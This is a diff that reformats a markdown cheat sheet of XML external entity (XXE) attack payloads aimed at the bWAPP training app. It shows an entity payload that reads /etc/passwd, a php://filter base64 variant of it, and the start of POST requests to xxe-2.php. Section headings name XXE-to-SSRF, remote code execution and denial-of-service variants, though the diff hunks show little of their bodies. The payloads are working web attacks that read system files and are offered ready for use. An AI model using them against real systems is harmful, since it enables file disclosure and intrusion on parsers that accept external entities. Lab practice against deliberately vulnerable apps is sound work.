@@ -1,13 +1,15 @@
 Get etc/passwd file
 ===================
-Payload:
---------
+__Payload:__
 
+
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE Header [<!ENTITY xxe SYSTEM "///etc/passwd" >]>
+```
 
-Request:
---------
+__Request:__
+
 
 ```http
 POST /bWAPP/bWAPP/xxe-2.php HTTP/1.1
@@ -32,8 +34,8 @@ Connection: close
 Calling The Remote File
 ========================
 
-Payload:
--------
+__Payload:__
+
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -41,8 +43,8 @@ Payload:
 <reset><login>&xxe;</login><secret>Any bugs?</secret></reset>
 ```
 
-REQUEST:
---------
+__REQUEST:__
+
 
 ```http
 POST /bWAPP/bWAPP/xxe-2.php HTTP/1.1
@@ -84,8 +86,8 @@ OR
 ---
 
 
-Reading Files
--------------
+__Reading Files__
+
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -99,8 +101,8 @@ Reading Files
 
 
 
-Listing Directories
--------------------
+__Listing Directories__
+
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -115,8 +117,8 @@ Listing Directories
 
 
 
-Base64 Conversion of Result
----------------------------
+__Base64 Conversion of Result__
+
 ```xml
 <!DOCTYPE student [
 <!ENTITY pwn SYSTEM "php://filter/convert.base64-
@@ -130,8 +132,8 @@ encode/resource=/etc/passwd">
 
 
 
-XXE to SSRF
------------
+__XXE to SSRF__
+
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -146,8 +148,8 @@ XXE to SSRF
 
 
 
-xxe to RCE
-----------
+__xxe to RCE__
+
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -160,8 +162,8 @@ xxe to RCE
 ```
 
 
-XXE to DOS
------------
+__XXE to DOS__
+
 
 ```xml
 
@@ -177,8 +179,8 @@ XXE to DOS
 
 
 
-XXE Quadratic blowup [DOS]
----------------------
+__XXE Quadratic blowup [DOS]__
+
 
 ```xml
 <?xml version="1.0"?>
